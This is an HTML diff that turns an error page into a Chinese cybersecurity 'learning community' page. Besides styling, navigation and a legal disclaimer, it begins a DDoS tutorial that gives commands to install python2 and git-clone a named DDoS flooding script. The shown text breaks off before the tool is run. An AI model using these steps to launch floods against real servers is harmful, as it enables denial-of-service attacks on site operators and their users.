@@ -1,108 +1,3136 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>网址无法打开</title>
-    <style>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>枫叶网络安全学习社区 | 合法合规·实战攻防学习</title>
+    <meta name='robots' content='noindex, nofollow' />
+    <meta name="keywords" content="枫叶安全,网络安全,KaliLinux,Termux,DDOS攻防,漏洞挖掘,安全防护,漏洞提交,合法学习" />
+    <meta name="description" content="枫叶网络安全学习社区，专注合法合规的网络安全实战学习，提供Kali/Termux工具使用、DDoS攻防、SQL注入防护、漏洞挖掘与提交全套教程，严禁任何非法用途！" />
+    <link rel="shortcut icon" href="#" type="image/x-icon" />
+    <!-- 引入FontAwesome图标库 -->
+    <link rel="stylesheet" href="https://static.jyshare.com/assets/font-awesome-4.7.0/css/font-awesome.min.css" media="all" />
+    <!-- 引入jQuery -->
+    <script src="https://static.char123.com/assets/libs/jquery.min.js"></script>
+    <style type="text/css">
+        /* 基础样式重置 - 开始 */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            font-family: "Microsoft Yahei", "PingFang SC", Arial, sans-serif;
         }
         body {
-            background-color: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.8;
+            font-size: 14px;
         }
-        .illustration {
-            margin-bottom: 30px;
+        a {
+            text-decoration: none;
+            color: #333;
+            transition: all 0.3s ease;
+        }
+        a:hover {
+            color: #e74c3c;
+        }
+        ul, li {
+            list-style: none;
+        }
+        input, button {
+            outline: none;
+            border: none;
+            font-family: inherit;
+        }
+        pre, code {
+            font-family: Consolas, "Monaco", monospace;
+            background: #f8f8f8;
+            border-radius: 4px;
+        }
+        pre {
+            padding: 15px;
+            overflow-x: auto;
+            border-left: 5px solid #3498db;
+            margin: 15px 0;
+        }
+        code {
+            padding: 2px 5px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        table th, table td {
+            padding: 12px 15px;
+            border: 1px solid #eee;
+            text-align: left;
+        }
+        table th {
+            background: #f8f8f8;
+            font-weight: bold;
+            color: #333;
+        }
+        table tr:hover {
+            background: #f5f5f5;
+        }
+        .container {
+            width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        @media (max-width: 1200px) {
+            .container {
+                width: 100%;
+            }
+        }
+        /* 基础样式重置 - 结束 */
+
+        /* 头部Logo+搜索栏 - 开始 */
+        .logo-search {
+            background: #2c3e50;
+            padding: 15px 0;
+            color: #fff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .logo-search .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .logo-search .logo h1 {
+            font-size: 24px;
+            font-weight: normal;
+            margin-bottom: 10px;
+        }
+        .logo-search .logo h1 a {
+            color: #fff;
+            display: flex;
+            align-items: center;
+        }
+        .logo-search .logo h1 a i {
+            margin-right: 10px;
+            font-size: 28px;
+            color: #e74c3c;
+        }
+        .logo-search .search input {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            width: 280px;
+            outline: none;
+            font-size: 14px;
+            height: 44px;
+        }
+        @media (max-width: 768px) {
+            .logo-search .search input {
+                width: 100%;
+                margin-top: 10px;
+            }
+        }
+        /* 头部Logo+搜索栏 - 结束 */
+
+        /* 主导航栏 - 开始 */
+        .navigation {
+            background: #34495e;
+            border-bottom: 1px solid #2c3e50;
+            position: sticky;
+            top: 0;
+            z-index: 999;
+        }
+        .navigation .pc-nav {
+            display: flex;
+            list-style: none;
+        }
+        .navigation .pc-nav li {
+            position: relative;
+        }
+        .navigation .pc-nav li a {
+            display: block;
+            padding: 15px 20px;
+            color: #fff;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .navigation .pc-nav li a:hover {
+            background: #2c3e50;
+            color: #e74c3c;
+        }
+        .navigation .pc-nav li a.active {
+            background: #e74c3c;
+            color: #fff;
+        }
+        .navigation .mobile-nav {
+            display: none;
+            list-style: none;
+            padding: 10px 0;
+        }
+        .navigation .mobile-nav li a {
+            display: block;
+            padding: 10px 20px;
+            color: #fff;
+            border-bottom: 1px solid #4a6583;
+        }
+        .mobile-nav-toggle {
+            display: none;
+            color: #fff;
+            font-size: 20px;
+            padding: 15px 20px;
+            cursor: pointer;
+        }
+        @media (max-width: 768px) {
+            .navigation .pc-nav {
+                display: none;
+            }
+            .navigation .mobile-nav {
+                display: none;
+            }
+            .navigation .mobile-nav.show {
+                display: block;
+            }
+            .mobile-nav-toggle {
+                display: block;
+            }
+        }
+        /* 主导航栏 - 结束 */
+
+        /* 子导航栏 - 开始 */
+        .sub-navigation {
+            background: #fff;
+            border-bottom: 1px solid #eee;
+            padding: 10px 0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .sub-navigation .nav-sub {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .sub-navigation .nav-sub ul {
+            list-style: none;
+            margin-right: 30px;
+            margin-bottom: 10px;
+        }
+        .sub-navigation .nav-sub ul li {
+            display: inline-block;
+            margin-right: 15px;
+        }
+        .sub-navigation .nav-sub ul li a {
+            color: #333;
+            text-decoration: none;
+            padding: 5px 0;
+            display: block;
+            font-size: 14px;
+        }
+        .sub-navigation .nav-sub ul li a:hover {
+            color: #e74c3c;
+            border-bottom: 2px solid #e74c3c;
+        }
+        /* 子导航栏 - 结束 */
+
+        /* 主内容区布局 - 开始 */
+        .main {
+            display: flex;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .left-column {
+            width: 250px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-right: 20px;
+            margin-bottom: 20px;
+            flex-shrink: 0;
+        }
+        .middle-column {
+            flex: 1;
+            background: #fff;
+            padding: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .right-column {
+            width: 280px;
+            margin-left: 20px;
+            margin-bottom: 20px;
+            flex-shrink: 0;
+        }
+        @media (max-width: 992px) {
+            .left-column {
+                width: 100%;
+                margin-right: 0;
+            }
+            .right-column {
+                width: 100%;
+                margin-left: 0;
+            }
+        }
+        /* 主内容区布局 - 结束 */
+
+        /* 左侧栏样式 - 开始 */
+        .left-column .tab {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+        }
+        .left-column .tab i {
+            color: #e74c3c;
+            margin-right: 10px;
+        }
+        .left-column .gallery-list a {
+            display: block;
+            padding: 12px 0;
+            color: #333;
+            text-decoration: none;
+            border-bottom: 1px solid #f5f5f5;
+            font-size: 14px;
+        }
+        .left-column .gallery-list a:hover {
+            color: #e74c3c;
+            padding-left: 8px;
+            transition: all 0.3s ease;
+        }
+        .left-column .qq-group {
+            margin-top: 30px;
+            padding: 15px;
+            background: #fef5f5;
+            border: 1px solid #fde2e2;
+            border-radius: 4px;
             text-align: center;
         }
-        .illustration svg {
-            width: 280px;
-            height: auto;
+        .left-column .qq-group h3 {
+            font-size: 16px;
+            color: #e74c3c;
+            margin-bottom: 10px;
         }
-        h1 {
-            font-size: 36px;
-            color: #000;
-            font-weight: 500;
+        .left-column .qq-group p {
+            font-size: 18px;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        /* 左侧栏样式 - 结束 */
+
+        /* 中间内容区通用样式 - 开始 */
+        .article-heading {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: #2c3e50;
+            border-bottom: 2px solid #e74c3c;
+            padding-bottom: 10px;
+            line-height: 1.2;
+        }
+        .legal-tip {
+            background: #ffebee;
+            border-left: 5px solid #e74c3c;
+            padding: 18px;
+            margin-bottom: 25px;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        .legal-tip i {
+            margin-right: 10px;
+            color: #e74c3c;
+        }
+        .tutorial-section {
+            margin-bottom: 50px;
+        }
+        .tutorial-section h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #34495e;
+            display: flex;
+            align-items: center;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .tutorial-section h2 i {
+            color: #e74c3c;
+            margin-right: 10px;
+        }
+        .tutorial-section h3 {
+            font-size: 20px;
+            margin: 20px 0 15px;
+            color: #2c3e50;
+        }
+        .tutorial-section h4 {
+            font-size: 16px;
+            margin: 15px 0 10px;
+            color: #34495e;
+        }
+        .tutorial-section p {
+            margin-bottom: 12px;
+            text-indent: 2em;
+        }
+        .tutorial-section ul {
+            margin-left: 40px;
+            margin-bottom: 15px;
+            list-style: disc;
+        }
+        .tutorial-section ol {
+            margin-left: 40px;
+            margin-bottom: 15px;
+            list-style: decimal;
+        }
+        .tutorial-section ul li, .tutorial-section ol li {
+            margin-bottom: 8px;
+        }
+        .tip-box {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .tip-danger {
+            background: #ffebee;
+            border-left: 5px solid #e53935;
+            color: #c62828;
+        }
+        .tip-warning {
+            background: #fff8e1;
+            border-left: 5px solid #ffc107;
+            color: #ff8f00;
+        }
+        .tip-info {
+            background: #e3f2fd;
+            border-left: 5px solid #2196f3;
+            color: #1565c0;
+        }
+        .tip-success {
+            background: #e8f5e9;
+            border-left: 5px solid #4caf50;
+            color: #2e7d32;
+        }
+        .collect-btn {
+            padding: 8px 15px;
+            background: #e74c3c;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            display: inline-flex;
+            align-items: center;
+        }
+        .collect-btn i {
+            margin-right: 5px;
+        }
+        .collect-btn:hover {
+            background: #d63031;
+        }
+        /* 中间内容区通用样式 - 结束 */
+
+        /* 功能面板样式 - 开始 */
+        .function-panel {
+            background: #fff;
+            padding: 25px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+        }
+        .function-panel h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #2c3e50;
+            display: flex;
+            align-items: center;
+        }
+        .function-panel h2 i {
+            color: #e74c3c;
+            margin-right: 10px;
+        }
+        .function-panel .panel-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+        .function-panel .panel-item {
+            background: #f8f9fa;
+            padding: 20px 15px;
+            border-radius: 4px;
+            text-align: center;
+            border: 1px solid #eee;
+            transition: all 0.3s ease;
+        }
+        .function-panel .panel-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            border-color: #e74c3c;
+        }
+        .function-panel .panel-item i {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #3498db;
+        }
+        .function-panel .panel-item a {
+            color: #34495e;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        .function-panel .panel-item a:hover {
+            color: #e74c3c;
+        }
+        @media (max-width: 768px) {
+            .function-panel .panel-grid {
+                grid-template-columns: repeat(1, 1fr);
+            }
+        }
+        /* 功能面板样式 - 结束 */
+
+        /* 右侧栏样式 - 开始 */
+        .sidebar-box {
+            background: #fff;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .sidebar-box h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+        }
+        .sidebar-box h3 i {
+            color: #e74c3c;
+            margin-right: 10px;
+        }
+        .sidebar-box .cate-list li {
             margin-bottom: 12px;
         }
-        .desc {
-            font-size: 20px;
-            color: #666;
-            margin-bottom: 40px;
-            text-align: center;
-        }
-        .buttons {
-            display: flex;
-            gap: 20px;
-        }
-        button {
-            padding: 12px 32px;
-            border-radius: 12px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .btn-detail {
-            border: 1px solid #ccc;
-            background: #fff;
-            color: #666;
-        }
-        .btn-retry {
-            border: 1px solid #ccc;
-            background: #fff;
-            color: #666;
+        .sidebar-box .cate-list li a {
+            color: #333;
+            text-decoration: none;
             display: flex;
             align-items: center;
-            gap: 6px;
         }
-        .btn-retry:hover, .btn-detail:hover {
-            background-color: #f5f5f5;
+        .sidebar-box .cate-list li a i {
+            margin-right: 8px;
+            font-size: 12px;
+            color: #3498db;
         }
-        .retry-icon {
+        .sidebar-box .cate-list li a:hover {
+            color: #e74c3c;
+        }
+        .sidebar-box .hot-tutorial li {
+            padding: 10px 0;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        .sidebar-box .hot-tutorial li a {
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        .sidebar-box .link-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .sidebar-box .link-list a {
+            padding: 5px 10px;
+            background: #f8f9fa;
+            border-radius: 20px;
+            font-size: 13px;
+        }
+        .sidebar-box .link-list a:hover {
+            background: #e74c3c;
+            color: #fff;
+        }
+        /* 右侧栏样式 - 结束 */
+
+        /* 分页样式 - 开始 */
+        .pagination {
+            display: flex;
+            justify-content: center;
+            margin: 40px 0;
+            flex-wrap: wrap;
+        }
+        .pagination a {
+            display: inline-block;
+            padding: 10px 15px;
+            margin: 0 5px 10px;
+            background: #fff;
+            border: 1px solid #eee;
+            color: #333;
+            text-decoration: none;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+        .pagination a.active {
+            background: #e74c3c;
+            color: #fff;
+            border-color: #e74c3c;
+        }
+        .pagination a:hover {
+            background: #f5f5f5;
+            border-color: #e74c3c;
+            color: #e74c3c;
+        }
+        /* 分页样式 - 结束 */
+
+        /* 底部样式 - 开始 */
+        #footer {
+            background: #2c3e50;
+            color: #fff;
+            padding: 50px 0 20px;
+            margin-top: 50px;
+        }
+        #footer .runoob-block {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+        #footer dl {
+            width: 200px;
+            margin-bottom: 30px;
+        }
+        @media (max-width: 768px) {
+            #footer dl {
+                width: 100%;
+            }
+        }
+        #footer dt {
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: bold;
+            color: #fff;
+            padding-bottom: 5px;
+            border-bottom: 2px solid #e74c3c;
+            display: inline-block;
+        }
+        #footer dd {
+            margin-bottom: 8px;
+        }
+        #footer dd a {
+            color: #ccc;
+            text-decoration: none;
+        }
+        #footer dd a:hover {
+            color: #e74c3c;
+            margin-left: 5px;
+        }
+        #footer .copyright {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid #34495e;
+            color: #ccc;
+            font-size: 13px;
+            line-height: 2;
+        }
+        #footer .copyright a {
+            color: #e74c3c;
+        }
+        /* 底部样式 - 结束 */
+
+        /* 悬浮功能按钮 - 开始 */
+        .fixed-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 999;
+        }
+        .fixed-btn a {
+            display: block;
+            width: 48px;
+            height: 48px;
+            line-height: 48px;
+            text-align: center;
+            background: #e74c3c;
+            color: #fff;
+            border-radius: 50%;
+            box-shadow: 0 2px 10px rgba(231,76,60,0.5);
+            margin-bottom: 10px;
             font-size: 20px;
         }
+        .fixed-btn a:hover {
+            background: #d63031;
+        }
+        #dark-mode-toggle {
+            position: fixed;
+            bottom: 100px;
+            right: 30px;
+            z-index: 999;
+            padding: 12px;
+            background: #34495e;
+            color: #fff;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 18px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        #dark-mode-toggle:hover {
+            background: #2c3e50;
+            color: #e74c3c;
+        }
+        @media (max-width: 768px) {
+            .fixed-btn {
+                bottom: 20px;
+                right: 20px;
+            }
+            #dark-mode-toggle {
+                bottom: 80px;
+                right: 20px;
+            }
+        }
+        /* 悬浮功能按钮 - 结束 */
+
+        /* 代码高亮样式 - 开始 */
+        pre .com {color: #93a1a1;}
+        pre .lit {color: #195f91;}
+        pre .pun, pre .opn, pre .clo {color: #93a1a1;}
+        pre .fun {color: #dc322f;}
+        pre .str, pre .atv {color: #268bd2;}
+        pre .kwd, pre .tag {color: #195f91;}
+        pre .typ, pre .atn, pre .dec, pre .var {color: #cb4b16;}
+        pre .pln {color: #48484c;}
+        /* 代码高亮样式 - 结束 */
+
+        /* 暗黑模式样式 - 开始 */
+        body.dark-mode {
+            background: #1a1a1a;
+            color: #f5f5f5;
+        }
+        body.dark-mode a {
+            color: #f5f5f5;
+        }
+        body.dark-mode a:hover {
+            color: #e74c3c;
+        }
+        body.dark-mode .left-column,
+        body.dark-mode .middle-column,
+        body.dark-mode .right-column .sidebar-box,
+        body.dark-mode .function-panel,
+        body.dark-mode .pagination a,
+        body.dark-mode .sub-navigation {
+            background: #2d2d2d;
+            color: #f5f5f5;
+            border-color: #444;
+        }
+        body.dark-mode .sub-navigation .nav-sub ul li a:hover {
+            border-bottom-color: #e74c3c;
+        }
+        body.dark-mode pre, body.dark-mode code {
+            background: #333;
+            border-color: #555;
+        }
+        body.dark-mode table th {
+            background: #333;
+            border-color: #444;
+        }
+        body.dark-mode table tr:hover {
+            background: #333;
+        }
+        body.dark-mode table, body.dark-mode table td, body.dark-mode table th {
+            border-color: #444;
+        }
+        body.dark-mode .left-column .gallery-list a {
+            border-bottom-color: #444;
+        }
+        body.dark-mode .left-column .qq-group {
+            background: #3d2b2b;
+            border-color: #5a3a3a;
+        }
+        body.dark-mode .function-panel .panel-item {
+            background: #333;
+            border-color: #444;
+        }
+        body.dark-mode .pagination a:hover {
+            background: #333;
+        }
+        body.dark-mode .sidebar-box .link-list a {
+            background: #333;
+        }
+        body.dark-mode .sidebar-box .link-list a:hover {
+            background: #e74c3c;
+            color: #fff;
+        }
+        /* 暗黑模式样式 - 结束 */
     </style>
 </head>
 <body>
-    <div class="illustration">
-        <!-- 简化插画：人物+问号气泡+纸箱 -->
-        <svg viewBox="0 0 280 220" xmlns="http://www.w3.org/2000/svg">
-            <!-- 人物 -->
-            <path d="M120,160 L140,120 L160,160" fill="none" stroke="#e0e0e0" stroke-width="4"/>
-            <path d="M130,120 L130,80 Q140,60 155,65 L175,75 L170,100 L150,90 L140,110" fill="#415EAC"/>
-            <path d="M130,80 L110,90 L105,110 L120,105" fill="#415EAC"/>
-            <path d="M135,75 C142,68 150,70 152,78 C150,86 142,88 135,81" fill="#fff"/>
-            <circle cx="142" cy="72" r="2" fill="#333"/>
-            <circle cx="148" cy="74" r="2" fill="#333"/>
-            <path d="M143,80 Q146,83 150,82" fill="none" stroke="#333" stroke-width="1.5"/>
-            <!-- 手机 -->
-            <rect x="122" y="95" width="12" height="20" rx="2" fill="#333"/>
-            <!-- 问号气泡 -->
-            <circle cx="190" cy="80" r="30" fill="#fff" stroke="#ccc" stroke-width="1.5"/>
-            <text x="190" y="88" font-size="28" fill="#9C27B0" text-anchor="middle">?</text>
-            <!-- 纸箱 -->
-            <rect x="150" y="130" width="60" height="40" fill="#fff" stroke="#ccc" stroke-width="1.5"/>
-            <path d="M150,130 L180,115 L210,130" fill="#fff" stroke="#ccc" stroke-width="1.5"/>
-            <rect x="185" y="140" width="5" height="25" fill="#9FA8DA"/>
-        </svg>
+<!-- 头部Logo+搜索栏 -->
+<div class="container logo-search">
+    <div class="row">
+        <div class="col logo">
+            <h1><a href="/"><i class="fa fa-shield"></i> 枫叶网络安全学习社区</a></h1>
+        </div>
+        <div class="col search search-desktop last">
+            <div class="search-input">
+                <form action="/">
+                    <input class="placeholder" id="s" name="s" placeholder="搜索攻防教程/工具使用/漏洞挖掘……" autocomplete="off">
+                </form>
+            </div>
+        </div>
     </div>
-    <h1>网址暂时无法打开</h1>
-    <p class="desc">请确认网址输入或切换网络后刷新</p>
-    <div class="buttons">
-        <button class="btn-detail">查看详情</button>
-        <button class="btn-retry">
-            <span class="retry-icon">⟳</span>
-            重试
-        </button>
+</div>
+
+<!-- 主导航栏 -->
+<div class="container navigation">
+    <div class="mobile-nav-toggle"><i class="fa fa-bars"></i></div>
+    <div class="row">
+        <div class="col nav">
+            <ul class="pc-nav" id="runoob-detail-nav">
+                <li><a href="#" class="active"><i class="fa fa-home"></i> 首页</a></li>
+                <li><a href="#attack"><i class="fa fa-bomb"></i> 攻击技术（仅学习）</a></li>
+                <li><a href="#defense"><i class="fa fa-shield"></i> 防护方案</a></li>
+                <li><a href="#vulnerability"><i class="fa fa-search-plus"></i> 漏洞挖掘</a></li>
+                <li><a href="#legal"><i class="fa fa-gavel"></i> 法律规范</a></li>
+                <li><a href="#tools"><i class="fa fa-wrench"></i> 工具使用</a></li>
+                <li><a href="#case"><i class="fa fa-book"></i> 案例分析</a></li>
+                <li><a href="#faq"><i class="fa fa-question-circle"></i> 常见问题</a></li>
+            </ul>
+            <ul class="mobile-nav">
+                <li><a href="#" class="active"><i class="fa fa-home"></i> 首页</a></li>
+                <li><a href="#attack"><i class="fa fa-bomb"></i> 攻击技术（仅学习）</a></li>
+                <li><a href="#defense"><i class="fa fa-shield"></i> 防护方案</a></li>
+                <li><a href="#vulnerability"><i class="fa fa-search-plus"></i> 漏洞挖掘</a></li>
+                <li><a href="#legal"><i class="fa fa-gavel"></i> 法律规范</a></li>
+                <li><a href="#tools"><i class="fa fa-wrench"></i> 工具使用</a></li>
+                <li><a href="#case"><i class="fa fa-book"></i> 案例分析</a></li>
+                <li><a href="#faq"><i class="fa fa-question-circle"></i> 常见问题</a></li>
+            </ul>
+        </div>
     </div>
+</div>
+
+<!-- 子导航栏 -->
+<div class="container sub-navigation sub-navigation-articles">
+    <div class="row">
+        <div class="col nav-sub">
+            <ul id="attack">
+                <li class="cat-item"><a href="#ddos">DDoS攻击原理与防护</a></li>
+                <li class="cat-item"><a href="#sql">SQL注入原理</a></li>
+                <li class="cat-item"><a href="#xss">XSS跨站脚本攻击</a></li>
+                <li class="cat-item"><a href="#brute">暴力破解原理</a></li>
+            </ul>
+            <ul id="defense">
+                <li class="cat-item"><a href="#firewall">防火墙配置</a></li>
+                <li class="cat-item"><a href="#audit">日志审计</a></li>
+                <li class="cat-item"><a href="#encrypt">数据加密</a></li>
+                <li class="cat-item"><a href="#patch">补丁管理</a></li>
+            </ul>
+            <ul id="vulnerability">
+                <li class="cat-item"><a href="#scan">漏洞扫描</a></li>
+                <li class="cat-item"><a href="#submit">漏洞提交规范</a></li>
+                <li class="cat-item"><a href="#verify">漏洞验证</a></li>
+                <li class="cat-item"><a href="#fix">漏洞修复</a></li>
+            </ul>
+            <ul id="tools">
+                <li class="cat-item"><a href="#kali">Kali Linux工具</a></li>
+                <li class="cat-item"><a href="#termux">Termux工具</a></li>
+                <li class="cat-item"><a href="#scan_tool">扫描工具</a></li>
+                <li class="cat-item"><a href="#exploit_tool">利用工具</a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+<!-- 主内容区 -->
+<div class="container main">
+    <!-- 左侧栏 -->
+    <div class="left-column">
+        <div class="tab">
+            <i class="fa fa-list"></i> 
+            <span>教程目录</span>
+        </div>
+        <div class="sidebar-box gallery-list" id="leftcolumn">
+            <a target="_top" href="#legal" title="法律声明">法律声明</a>
+            <a target="_top" href="#ddos" title="DDoS攻击原理与防护">DDoS攻击原理与防护</a>
+            <a target="_top" href="#sql" title="SQL注入原理与防护">SQL注入原理与防护</a>
+            <a target="_top" href="#xss" title="XSS攻击原理与防护">XSS攻击原理与防护</a>
+            <a target="_top" href="#brute" title="暴力破解防护">暴力破解防护</a>
+            <a target="_top" href="#scan" title="合法漏洞扫描">合法漏洞扫描</a>
+            <a target="_top" href="#submit" title="漏洞提交规范">漏洞提交规范</a>
+            <a target="_top" href="#firewall" title="防火墙配置教程">防火墙配置教程</a>
+            <a target="_top" href="#audit" title="日志审计教程">日志审计教程</a>
+            <a target="_top" href="#encrypt" title="数据加密教程">数据加密教程</a>
+            <a target="_top" href="#patch" title="系统补丁管理">系统补丁管理</a>
+            <a target="_top" href="#kali" title="Kali Linux工具使用">Kali Linux工具使用</a>
+            <a target="_top" href="#termux" title="Termux工具使用">Termux工具使用</a>
+            <a target="_top" href="#server" title="服务器安全配置">服务器安全配置</a>
+            <a target="_top" href="#web" title="Web安全防护">Web安全防护</a>
+            <a target="_top" href="#network" title="网络安全防护">网络安全防护</a>
+            <a target="_top" href="#mobile" title="移动端安全防护">移动端安全防护</a>
+            <a target="_top" href="#cloud" title="云安全防护">云安全防护</a>
+            <a target="_top" href="#case" title="安全案例分析">安全案例分析</a>
+            <a target="_top" href="#faq" title="常见问题解答">常见问题解答</a>
+        </div>
+        <div class="qq-group">
+            <h3><i class="fa fa-qq"></i> 学习交流群</h3>
+            <p>1078205267</p>
+            <p style="font-size:12px; color:#666; margin-top:5px;">仅交流合法防护技术，禁止非法讨论</p>
+        </div>
+    </div>
+
+    <!-- 中间内容区 -->
+    <div class="middle-column">
+        <div class="article">
+            <h1 class="article-heading">枫叶网络安全攻防学习教程（仅合法用途）</h1>
+            
+            <!-- 法律强制提示 -->
+            <div class="legal-tip" id="legal">
+                <i class="fa fa-exclamation-triangle"></i> 
+                <strong>法律强制提示</strong>：
+                1. 《中华人民共和国网络安全法》第二十七条规定：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；
+                2. 《刑法》第二百八十五条、第二百八十六条规定：非法侵入计算机信息系统、破坏计算机信息系统功能/数据/应用程序，将处三年以下有期徒刑或者拘役，后果特别严重的处三年以上七年以下有期徒刑；
+                3. 本教程仅用于学习网络安全防护技术，所有测试必须在自己拥有合法权限的设备/服务器上进行，严禁未经授权测试他人系统；
+                4. 如违反上述规定，一切法律责任由使用者自行承担，本社区不承担任何连带责任。
+            </div>
+
+            <!-- 核心功能导航面板 -->
+            <div class="function-panel">
+                <h2><i class="fa fa-cogs"></i> 核心功能导航</h2>
+                <div class="panel-grid">
+                    <div class="panel-item">
+                        <i class="fa fa-shield"></i>
+                        <p><a href="#defense">安全防护教程</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-search"></i>
+                        <p><a href="#vulnerability">漏洞挖掘学习</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-gavel"></i>
+                        <p><a href="#legal">法律规范解读</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-server"></i>
+                        <p><a href="#server">服务器安全</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-globe"></i>
+                        <p><a href="#web">Web安全防护</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-book"></i>
+                        <p><a href="#case">案例分析</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-question-circle"></i>
+                        <p><a href="#faq">常见问题</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-wrench"></i>
+                        <p><a href="#tools">安全工具</a></p>
+                    </div>
+                    <div class="panel-item">
+                        <i class="fa fa-cloud"></i>
+                        <p><a href="#cloud">云安全防护</a></p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- DDoS攻击原理与防护（经典Termux/Kali教程） -->
+            <div class="tutorial-section" id="ddos">
+                <button class="collect-btn" data-id="tutorial_1" data-title="DDoS攻击原理与防护"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-warning"></i> DDoS攻击原理与防护（经典Termux/Kali实操，仅学习）</h2>
+                <div class="tip-danger">
+                    <strong>重要提示</strong>：发起DDoS攻击属于违法犯罪行为，本章节仅讲解DDoS攻击的原理和经典工具操作方法，目的是帮助大家掌握防护方法，严禁用于任何攻击行为。
+                </div>
+                <h3>一、DDoS攻击核心原理</h3>
+                <p>DDoS（分布式拒绝服务）攻击是指攻击者控制大量傀儡机（肉鸡），向目标服务器发送海量的无效请求，耗尽服务器的带宽、CPU、内存等资源，导致合法用户无法访问服务器。核心分为三类：流量型攻击（耗尽带宽）、连接型攻击（耗尽连接数）、应用层攻击（耗尽应用资源）。</p>
+                <h3>二、经典Termux DDoS工具实操（pembriahmad/DDOS）</h3>
+                <p>该工具为入门级经典DDoS脚本，基于Python2开发，适用于Termux/Kali Linux，核心原理是发送海量TCP/UDP请求，以下为<strong>仅合法环境</strong>的实操步骤：</p>
+                <h4>1. 环境准备（Zero Termux/Kali）</h4>
+                <p>安装Python2、Python、Git基础依赖，终端逐行执行，<strong>注释</strong>：完成工具运行的基础软件包安装，-y表示自动确认安装：</p>
+                <pre>
+# 安装python+python2解释器+git版本控制工具，适配Termux/Kali环境
+pkg install python python2 git -y
+# Kali Linux可替换为apt指令
+apt install python python2 git -y
+                </pre>
+                <h4>2. 克隆工具仓库</h4>
+                <p>从Github拉取经典DDoS脚本，<strong>注释</strong>：将远程仓库源码克隆到本地终端环境：</p>
+                <pre>
+# 克隆github上pembriahmad/DDOS经典脚本仓库
+git clone https://github.com/pembriahmad/DDOS
+                </pre>
+                <h4>3. 进入工具目录</h4>
